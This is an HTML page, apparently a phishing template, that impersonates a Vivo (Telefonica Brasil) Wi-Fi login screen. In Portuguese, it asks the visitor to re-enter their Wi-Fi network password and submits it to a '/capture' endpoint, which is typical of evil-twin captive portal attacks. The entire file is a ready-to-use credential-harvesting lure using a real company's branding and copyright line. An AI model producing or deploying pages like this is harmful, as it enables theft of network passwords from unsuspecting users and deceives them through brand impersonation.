<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Helvetica Neue',Arial,sans-serif;background:#f4f4f8;min-height:100vh;
display:flex;flex-direction:column}
.header{background:linear-gradient(135deg,#660099 0%,#9900cc 100%);height:56px;
display:flex;align-items:center;padding:0 20px;
box-shadow:0 2px 8px rgba(102,0,153,.3)}
.vivo-logo{color:#fff;font-size:1.5em;font-weight:900;letter-spacing:-1px}
.header-right{color:rgba(255,255,255,.75);font-size:.78em;margin-left:auto}
.purple-stripe{background:#9900cc;height:3px}
.main{flex:1;display:flex;justify-content:center;align-items:center;padding:32px 16px}
.card{background:#fff;border-radius:12px;width:100%;max-width:390px;
box-shadow:0 4px 24px rgba(102,0,153,.12);overflow:hidden}
.card-top{background:linear-gradient(135deg,#660099,#9900cc);padding:24px;text-align:center}
.card-top h1{color:#fff;font-size:1.15em;font-weight:700}
.card-top p{color:rgba(255,255,255,.85);font-size:.82em;margin-top:8px;line-height:1.5}
.card-body{padding:24px}
.field{margin-bottom:18px}
label{display:block;font-size:.82em;color:#444;margin-bottom:5px;font-weight:600}
input[type=password]{width:100%;padding:11px 12px;border:1.5px solid #e0d8e8;border-radius:8px;
font-size:.93em;outline:none;transition:border .2s}
input[type=password]:focus{border-color:#660099;box-shadow:0 0 0 2px rgba(102,0,153,.1)}
.btn-connect{width:100%;background:linear-gradient(135deg,#660099,#9900cc);color:#fff;
border:none;border-radius:8px;padding:12px;font-size:.95em;font-weight:700;cursor:pointer;
transition:opacity .2s}
.btn-connect:hover{opacity:.9}
.info{font-size:.75em;color:#888;text-align:center;margin-top:14px;line-height:1.5}
.footer{text-align:center;padding:10px;font-size:.7em;color:#bbb;border-top:1px solid #f0f0f0}
</style>

<div class="header">

  <div class="header-right" data-i18n="header_right">Wi-Fi</div>
</div>
<div class="purple-stripe"></div>
<div class="main">
  <div class="card">
    <div class="card-top">
      <h1 data-i18n="title">vivo Wi-Fi - Autenticacao</h1>
      <p data-i18n="sub">Para continuar conectado, confirme a senha da sua rede Wi-Fi</p>
    </div>
    <div class="card-body">
      <form method="POST" action="/capture" autocomplete="off">
        <input type="hidden" name="csrf_token" value="">
        <div class="field">
          <label for="password" data-i18n="lbl_pass">Senha da rede Wi-Fi</label>
          <input type="password" id="password" name="password"
                 data-i18n-ph="ph_pass" placeholder="Digite a senha da rede"
                 required minlength="8" maxlength="63">
        </div>
        <button type="submit" class="btn-connect" data-i18n="btn">Conectar</button>
      </form>
      <p class="info" data-i18n="info">Ao continuar, voce concorda com os Termos de Uso da Vivo e nossa Politica de Privacidade.</p>
    </div>
    <div class="footer" data-i18n="footer">&copy; 2024 Telefonica Brasil S.A. - vivo. Todos os direitos reservados.</div>
  </div>
</div>
